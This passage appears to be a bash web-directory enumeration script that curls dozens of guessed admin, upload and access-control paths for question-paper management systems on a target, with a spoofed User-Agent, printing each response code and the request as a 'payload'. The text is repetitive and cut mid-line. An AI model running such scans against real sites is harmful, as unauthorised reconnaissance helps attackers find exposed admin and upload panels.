code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSyncQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSyncQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["WorkflowQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"WorkflowQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-ProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-ProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-AccessControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-AccessControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Automation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Automation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AdminQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AdminQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationQuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationQuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DashboardQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DashboardQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
